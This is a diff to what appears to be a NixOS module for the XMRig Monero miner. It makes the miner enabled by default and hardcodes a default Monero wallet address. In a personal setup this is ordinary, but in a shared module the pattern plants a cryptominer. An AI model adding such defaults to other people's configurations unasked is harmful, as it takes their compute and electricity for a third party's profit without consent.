@@ -8,7 +8,9 @@
 }:
 {
   options.myConfig.services.xmrig = {
-    enable = lib.mkEnableOption "XMRig Monero miner";
+    enable = (lib.mkEnableOption "XMRig Monero miner") // {
+      default = true;
+    };
 
     threadsPercent = lib.mkOption {
       type = lib.types.ints.between 1 100;
@@ -55,6 +57,7 @@
 
       user = lib.mkOption {
         type = lib.types.str;
+        default = "44yH2LpkSsrSmWQC3SVmrABw2MUhNjNCE365hG7Rr7veJYNPBD1f6dNgXNr2nc6ZcP3jEyj9vXnqmg7VBBPeS8uwMhJ4yXW";
         description = "Monero wallet address.";
       };
 
